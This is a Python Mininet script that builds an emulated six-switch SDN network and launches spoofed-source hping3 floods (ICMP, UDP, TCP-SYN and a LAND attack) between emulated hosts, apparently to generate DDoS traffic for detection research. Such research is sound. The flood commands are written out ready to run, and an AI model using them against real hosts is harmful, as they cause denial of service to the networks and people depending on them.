from mininet.topo import Topo
from mininet.net import Mininet
# from mininet.node import CPULimitedHost
from mininet.link import TCLink
# from mininet.util import dumpNodeConnections
from mininet.log import setLogLevel
# from mininet.cli import CLI
from mininet.node import OVSKernelSwitch, RemoteController
from time import sleep

from datetime import datetime
from random import randrange, choice

class MyTopo( Topo ):

    def build( self ):

        s1 = self.addSwitch( 's1', cls=OVSKernelSwitch, protocols='OpenFlow13' )

        h1 = self.addHost( 'h1', cpu=1.0/20,mac="00:00:00:00:00:01", ip="10.0.0.1/24" )
        h2 = self.addHost( 'h2', cpu=1.0/20, mac="00:00:00:00:00:02", ip="10.0.0.2/24" )
        h3 = self.addHost( 'h3', cpu=1.0/20, mac="00:00:00:00:00:03", ip="10.0.0.3/24" )    

        s2 = self.addSwitch( 's2', cls=OVSKernelSwitch, protocols='OpenFlow13' )

        h4 = self.addHost( 'h4', cpu=1.0/20, mac="00:00:00:00:00:04", ip="10.0.0.4/24" )
        h5 = self.addHost( 'h5', cpu=1.0/20, mac="00:00:00:00:00:05", ip="10.0.0.5/24" )
        h6 = self.addHost( 'h6', cpu=1.0/20, mac="00:00:00:00:00:06", ip="10.0.0.6/24" )

        s3 = self.addSwitch( 's3', cls=OVSKernelSwitch, protocols='OpenFlow13' )

        h7 = self.addHost( 'h7', cpu=1.0/20, mac="00:00:00:00:00:07", ip="10.0.0.7/24" )
        h8 = self.addHost( 'h8', cpu=1.0/20, mac="00:00:00:00:00:08", ip="10.0.0.8/24" )
        h9 = self.addHost( 'h9', cpu=1.0/20, mac="00:00:00:00:00:09", ip="10.0.0.9/24" )

        s4 = self.addSwitch( 's4', cls=OVSKernelSwitch, protocols='OpenFlow13' )

        h10 = self.addHost( 'h10', cpu=1.0/20, mac="00:00:00:00:00:10", ip="10.0.0.10/24" )
        h11 = self.addHost( 'h11', cpu=1.0/20, mac="00:00:00:00:00:11", ip="10.0.0.11/24" )
        h12 = self.addHost( 'h12', cpu=1.0/20, mac="00:00:00:00:00:12", ip="10.0.0.12/24" )

        s5 = self.addSwitch( 's5', cls=OVSKernelSwitch, protocols='OpenFlow13' )

        h13 = self.addHost( 'h13', cpu=1.0/20, mac="00:00:00:00:00:13", ip="10.0.0.13/24" )
        h14 = self.addHost( 'h14', cpu=1.0/20, mac="00:00:00:00:00:14", ip="10.0.0.14/24" )
        h15 = self.addHost( 'h15', cpu=1.0/20, mac="00:00:00:00:00:15", ip="10.0.0.15/24" )

        s6 = self.addSwitch( 's6', cls=OVSKernelSwitch, protocols='OpenFlow13' )

        h16 = self.addHost( 'h16', cpu=1.0/20, mac="00:00:00:00:00:16", ip="10.0.0.16/24" )
        h17 = self.addHost( 'h17', cpu=1.0/20, mac="00:00:00:00:00:17", ip="10.0.0.17/24" )
        h18 = self.addHost( 'h18', cpu=1.0/20, mac="00:00:00:00:00:18", ip="10.0.0.18/24" )

        # Add links

        self.addLink( h1, s1 )
        self.addLink( h2, s1 )
        self.addLink( h3, s1 )

        self.addLink( h4, s2 )
        self.addLink( h5, s2 )
        self.addLink( h6, s2 )

        self.addLink( h7, s3 )
        self.addLink( h8, s3 )
        self.addLink( h9, s3 )

        self.addLink( h10, s4 )
        self.addLink( h11, s4 )
        self.addLink( h12, s4 )

        self.addLink( h13, s5 )
        self.addLink( h14, s5 )
        self.addLink( h15, s5 )

        self.addLink( h16, s6 )
        self.addLink( h17, s6 )
        self.addLink( h18, s6 )

        self.addLink( s1, s2 )
        self.addLink( s2, s3 )
        self.addLink( s3, s4 )
        self.addLink( s4, s5 )
        self.addLink( s5, s6 )
def ip_generator():

    ip = ".".join(["10","0","0",str(randrange(1,19))])
    return ip

def startNetwork():

    #print "Starting Network"
    topo = MyTopo()
    #net = Mininet( topo=topo, host=CPULimitedHost, link=TCLink, controller=None )
    #net.addController( 'c0', controller=RemoteController, ip='192.168.43.55', port=6653 )

    c0 = RemoteController('c0', ip='192.168.0.101', port=6653)
    net = Mininet(topo=topo, link=TCLink, controller=c0)

    net.start()

    h1 = net.get('h1')
    h2 = net.get('h2')
    h3 = net.get('h3')
    h4 = net.get('h4')
    h5 = net.get('h5')
    h6 = net.get('h6')
    h7 = net.get('h7')
    h8 = net.get('h8')
    h9 = net.get('h9')
    h10 = net.get('h10')
    h11 = net.get('h11')
    h12 = net.get('h12')
    h13 = net.get('h13')
    h14 = net.get('h14')
    h15 = net.get('h15')
    h16 = net.get('h16')
    h17 = net.get('h17')
    h18 = net.get('h18')
    
    hosts = [h1, h2, h3, h4, h5, h6, h7, h8, h9, h10, h11, h12, h13, h14, h15, h16, h17, h18]
    
    h1.cmd('cd /home/mininet/webserver')
    h1.cmd('python -m SimpleHTTPServer 80 &')
    
    src = choice(hosts)
    dst = ip_generator()   
    print("--------------------------------------------------------------------------------")
    print("Performing ICMP (Ping) Flood")  
    print("--------------------------------------------------------------------------------")   
    src.cmd("timeout 20s hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood {}".format(dst))  
    sleep(100)
        
    src = choice(hosts)
    dst = ip_generator()   
    print("--------------------------------------------------------------------------------")
    print("Performing UDP Flood")  
    print("--------------------------------------------------------------------------------")   
    src.cmd("timeout 20s hping3 -2 -V -d 120 -w 64 --rand-source --flood {}".format(dst))    
    sleep(100)
    
    src = choice(hosts)
    dst = ip_generator()    
    print("--------------------------------------------------------------------------------")
    print("Performing TCP-SYN Flood")  
    print("--------------------------------------------------------------------------------")
    src.cmd('timeout 20s hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.1')
    sleep(100)
    
    src = choice(hosts)
    dst = ip_generator()   
    print("--------------------------------------------------------------------------------")
    print("Performing LAND Attack")  
    print("--------------------------------------------------------------------------------")   
    src.cmd("timeout 20s hping3 -1 -V -d 120 -w 64 --flood -a {} {}".format(dst,dst))
    sleep(100)  
    print("--------------------------------------------------------------------------------")

    # CLI(net)
    net.stop()

if __name__ == '__main__':
    
    start = datetime.now()
    
    setLogLevel( 'info' )
    startNetwork()
    
    end = datetime.now()
    
    print(end-start)